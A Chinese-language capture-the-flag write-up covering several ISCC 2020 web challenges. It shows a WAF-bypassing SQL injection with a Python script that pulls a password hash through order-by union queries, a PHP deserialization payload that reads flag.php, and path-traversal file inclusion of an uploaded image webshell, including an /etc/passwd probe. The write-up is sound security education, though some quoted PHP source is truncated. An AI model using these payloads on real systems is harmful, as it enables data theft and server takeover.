# ISCC 2020 Web WriteUp
##### 译文声明
本文是翻译文章
译文仅供参考，具体内容表达以及含义原文为准。
## 前言
记录一下ISCC2020历经25天的Web题解，题量可能有点多 QAQ
！！针对题目的难易程度上：易、中、难都有（老少皆宜），此次比赛和以往不太一样，增加了擂台题和实战题一定程度上还是不错的。
## 练武题-Web
###  阿森的爱情-1
考点：敏感信息收集
使用工具对网站进行敏感信息的探测，存在`readme.txt`
访问`readme.txt`直接得到flag
    flag{uragoodman}
###  阿森的爱情-2
考点：SQL注入
题目打开是一个登录界面，测试是否存在注入，发现有waf拦截
碰到这样直接fuzz探测存在哪些字符被拦截，只有知道哪些字符被拦截了才能够进行下一步的注入绕过，这里使用bp进行fuzz
紧接着测试发现存在布尔盲注
    username=admin' and 2>1#&password=11&submit=enter
虽然存在布尔盲注，但是由于网站waf对一些特殊字符的拦截导致布尔盲注无法利用，同时在测试时间盲注和报错盲注的时候也是因为waf的拦截导致无法利用。
既然因为waf的拦截导致无法利用，那就分析waf拦截的字符，发现对`select、order
by、union`等字符没有被过滤，所以这里可以尝试使用针对`order by`的联合查询注入读取敏感信息。
探测当前数据库表存在的列数（根据回显信息得出当前表为3列，可以猜测三列分别为：id、username、password）
知道列数之后开始进行联合查询，测试发现存在联合查询注入，同时页面回显的内容正是第二列用户名的内容
根据之前的提示，flag存在于第三列密码字段列中：`The content in the password column is the
flag!`，但是因为页面回显的是第二列内容无法回显第三列内容，所以这里无法直接利用上述payload，到这里是否真的无法判断第三列内容呢，答案是否定的，这里可以巧妙的使用`order
by`以及结合页面的回显来判断第三列所存储的密码，下面编写测试数据表进行测试分析
测试数据:
    +----+----------+----------------------------------+
    | id | username | password                         |
    +----+----------+----------------------------------+
    |  1 | admin    | bfe42ac26e273ef3a859a651e0a02df0 |
    +----+----------+----------------------------------+
注入分析:
由于网站联合注入显示的是第二列内容，那么我们就可以通过使用`order
by`操作第三列同时改变联合查询第三列的值，来判断网站数据库表中第三列的的存储的真实密码
payload
    select * from test.test0 union select 1,2,'c' order by 3,2;
`order by 3,2`表示先以第三列排序，如果遇到第三列内容完全相同则再使用第二列进行相同行的排序
由于使用第三列进行排序，所以当联合查询中第三列的字符如果小于等于真实的第三列密码字符则会页面会显示字符`2`，否则显示`admin`，下面通过测试用例来查看
    mysql> select * from test.test0 union select 1,2,'a' order by 3,2; 
    +----+----------+----------------------------------+
    | id | username | password                         |
    +----+----------+----------------------------------+
    |  1 | 2        | a                                |
    |  1 | admin    | bfe42ac26e273ef3a859a651e0a02df0 |
    +----+----------+----------------------------------+
    2 rows in set (0.00 sec)
    mysql> select * from test.test0 union select 1,2,'b' order by 3,2; 
    +----+----------+----------------------------------+ 
    | id | username | password                         |
    +----+----------+----------------------------------+
    |  1 | 2        | b                                |
    |  1 | admin    | bfe42ac26e273ef3a859a651e0a02df0 |
    +----+----------+----------------------------------+
    2 rows in set (0.00 sec)
    mysql> select * from test.test0 union select 1,2,'c' order by 3,2; 
    +----+----------+----------------------------------+
    | id | username | password                         |
    +----+----------+----------------------------------+
    |  1 | admin    | bfe42ac26e273ef3a859a651e0a02df0 |
    |  1 | 2        | c                                | 
    +----+----------+----------------------------------+ 
    2 rows in set (0.00 sec)
从结果可以验证，通过对第三列进行排序确实可以判断第三列所存储的密码，其真实密码等于页面显示`admin`判定出来的每一个字符减一，下面对中间字符判断测试
    mysql> select * from test.test0 union select 1,2,'bfe42ac26e26' order by 3,2;
    +----+----------+----------------------------------+                         
    | id | username | password                         |                         
    +----+----------+----------------------------------+                         
    |  1 | 2        | bfe42ac26e26                     |                         
    |  1 | admin    | bfe42ac26e273ef3a859a651e0a02df0 |                         
    +----+----------+----------------------------------+                         
    2 rows in set (0.00 sec)                                                     
    mysql> select * from test.test0 union select 1,2,'bfe42ac26e27' order by 3,2;
    +----+----------+----------------------------------+
    | id | username | password                         |
    +----+----------+----------------------------------+
    |  1 | 2        | bfe42ac26e27                     |
    |  1 | admin    | bfe42ac26e273ef3a859a651e0a02df0 |
    +----+----------+----------------------------------+
    2 rows in set (0.00 sec)
    mysql> select * from test.test0 union select 1,2,'bfe42ac26e28' order by 3,2;
    +----+----------+----------------------------------+
    | id | username | password                         |
    +----+----------+----------------------------------+
    |  1 | admin    | bfe42ac26e273ef3a859a651e0a02df0 |
    |  1 | 2        | bfe42ac26e28                     |
    +----+----------+----------------------------------+
    2 rows in set (0.00 sec)
最后对末尾字符进行判断
    mysql> select * from test.test0 union select 1,2,'bfe42ac26e273ef3a859a651e0a02df0' order by 3,2;
    +----+----------+----------------------------------+
    | id | username | password                         |
    +----+----------+----------------------------------+
    |  1 | 2        | bfe42ac26e273ef3a859a651e0a02df0 |
    |  1 | admin    | bfe42ac26e273ef3a859a651e0a02df0 |
    +----+----------+----------------------------------+
    2 rows in set (0.00 sec)
    mysql> select * from test.test0 union select 1,2,'bfe42ac26e273ef3a859a651e0a02df1' order by 3,2;
    +----+----------+----------------------------------+
    | id | username | password                         |
    +----+----------+----------------------------------+
    |  1 | admin    | bfe42ac26e273ef3a859a651e0a02df0 |
    |  1 | 2        | bfe42ac26e273ef3a859a651e0a02df1 |
    +----+----------+----------------------------------+
    2 rows in set (0.00 sec)
在判断末尾最后一个字符的时候`order by 3,2`中第二列判断就该起作用了
通过上述本地模拟数据的测试，现在编写脚本来对该网站进行注入读取敏感数据
    import requests
    url='http://101.201.126.95:7006'
    string='0123456789abcdefghijkmnlopqrstuvwxyz' #密码字段，大小写字母无所谓
    flag=''
    for i in range(300):
        for a in string:
            payload="admin' union select 1,'2','"+flag+str(a)+"' order by 3,2#"
            data={"username":payload, "password":1, "submit":"enter"}
            result=requests.post(url=url,data=data).text
            if 'admin' in result:
                flag+=string[string.index(a)-1]
                print(flag)
                break
注入结果
解密密码得到flag
    ciphertext：bfe42ac26e273ef3a859a651e0a02df0
    plaintext：iloveishuai
    flag{iloveishuai}
###  Php is the best language
考点：反序列化`__toString`的利用
根据提示下载文件
    file))
            {
                $filename = "./{$this->file}";
                if (base64_encode(file_get_contents($filename)))
                {
                    return base64_encode(file_get_contents($filename));
                }
            }
        }
    }
    if (isset($_GET['data']))
    {
        $data = $_GET['data'];
            $good = unserialize($data);
            echo $good;
    }
    else 
    {
        $url='./index.php';
    }
    $html='';
    if(isset($_POST['test'])){
        $s = $_POST['test'];
        $html.="谢谢参与!";
    }
    ?>
对下载下来的源码进行代码审计，发现存在反序列化参数可控，并且可以正常触发反序列数据，根据序列化代码部分，构造恶意的序列化payload
    file))
            {
                $filename = "./{$this->file}";
                if (base64_encode(file_get_contents($filename)))
                {
                    return base64_encode(file_get_contents($filename));
                }
            }
        }
    }
    $flag = new baby();
    $flag->file = 'flag.php';
    echo serialize($flag);
    ?>
继续审计，使用攻击载荷，对Get请求data传参，传入序列化数据，当反序列化数据被当作字符串处理时`echo`，会触发`__toString`反序列化载荷，然后由`file_get_contents($filename)`执行读取文件的操作
base64解码得到特殊文件内容
    flag{u_r_really_a_php_expert}
###  What can images do
考点：文件包含Bypass前缀限制、敏感信息泄露
题目面目
测试上传文件，发现只能上传`jpg,jpeg,png`格式
继续往下看，测试下一个功能发现存在文件包含
    ?filename=../../../../etc/passwd
然而并不能使用PHP伪协议，存在包含限制，于是对网站扫描敏感信息得到网站关键路径
`/inc/`目录存放网站上传功能的脚本
`include`目录存放网站包含所需的文件
`uploads`目录存放网站上传的文件
根据`include`目录文件信息可以猜测包含功能函数限制在`include`目录里面，类似代码如下：
    include(include/$filename);
这时候再看网站本身文件的包含，确实是直接限制在include目录里面
`?filename=file5.php&submit=提交查询`
这个时候已经很清楚了，由于没有对`../`进行过滤，直接上传图片马，路径穿透包含图片马Getshell
    http://101.201.126.95:7004/?filename=../uploads/2020/05/01/2418455eabbf3f5765a454339781.jpg&submit=%25E6%258F%2590%25E4%25BA%25A4%25E6%259F%25A5%25E8%25AF%25A2
    cat flag.php
    flag{ISCC_FREAKING_AWESOME}
**附题目源码**
  * index.php
    success！文件保存的路径为：{$upload['save_path']}";
        }else{
            $html.="{$upload['error']}";
        }
    }
    ?>
        ISCC | What can images do?
        body{background-image:url(./static/background.jpg);}